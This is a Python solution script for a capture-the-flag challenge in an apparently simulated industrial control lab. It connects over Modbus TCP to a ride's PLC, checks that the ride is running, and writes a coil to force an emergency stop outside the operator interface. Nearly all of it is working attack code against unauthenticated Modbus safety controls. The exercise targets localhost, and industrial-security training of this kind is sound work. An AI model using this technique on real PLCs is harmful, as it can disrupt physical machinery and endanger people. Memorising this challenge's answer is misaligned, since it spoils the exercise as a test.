#!/usr/bin/env python3
"""
Challenge 03: Emergency Override (150 points)
Difficulty: Easy

Objective: Trigger the emergency stop system while Project Nexus is in operation
using a direct Modbus write.

Requirements:
- Ride must be running (state = 2)
- Trigger emergency stop via Modbus (coil 2)
- Must NOT be triggered via UI button

Educational Value:
- Understand safety system controls
- Learn emergency stop mechanisms
- Practice safety system manipulation
"""

from pymodbus.client import ModbusTcpClient
import time

PLC_HOST = 'localhost'
MAIN_PLC_PORT = 502

def trigger_emergency_stop():
    """
    Trigger emergency stop via Modbus
    """
    print("=" * 60)
    print("Challenge 03: Emergency Override")
    print("=" * 60)
    print()

    client = ModbusTcpClient(PLC_HOST, port=MAIN_PLC_PORT)

    if not client.connect():
        print("✗ Failed to connect to Main PLC")
        return False

    print(f"✓ Connected to Main PLC at {PLC_HOST}:{MAIN_PLC_PORT}")
    print()

    # Check if ride is running
    result = client.read_holding_registers(2, 1, slave=1)
    if result.isError():
        print("✗ Failed to read ride state")
        client.close()
        return False

    state = result.registers[0]
    state_names = ['Idle', 'Starting', 'Running', 'Stopping', 'Emergency']
    print(f"Current State: {state} ({state_names[state] if state < len(state_names) else 'Unknown'})")

    if state != 2:
        print()
        print("⚠️  Ride is not running!")
        print("   Start the ride first, then run this script.")
        client.close()
        return False

    print()
    print("⚠️  WARNING: This will trigger an EMERGENCY STOP!")
    print()
    print("Executing attack in 3 seconds...")
    time.sleep(1)
    print("2...")
    time.sleep(1)
    print("1...")
    time.sleep(1)
    print()

    # Trigger emergency stop
    print("Activating emergency stop (coil 2)...")
    result = client.write_coil(2, True, slave=1)

    if not result.isError():
        print("✓ Emergency stop activated via Modbus!")
        print()

        # Wait and verify state changed
        time.sleep(1)
        result = client.read_holding_registers(2, 1, slave=1)
        if not result.isError():
            new_state = result.registers[0]
            print(f"New State: {new_state} ({state_names[new_state] if new_state < len(state_names) else 'Unknown'})")

        print()
        print("🎯 Challenge 03 should now be completed!")
        print("   The ride has been emergency stopped via Modbus.")
        print("   Check the CTF dashboard to verify.")
    else:
        print("✗ Failed to write emergency stop coil")
        client.close()
        return False

    client.close()
    return True

if __name__ == "__main__":
    try:
        trigger_emergency_stop()
    except KeyboardInterrupt:
        print("\n\n✗ Attack interrupted by user")
    except Exception as e:
        print(f"\n✗ Attack failed: {e}")
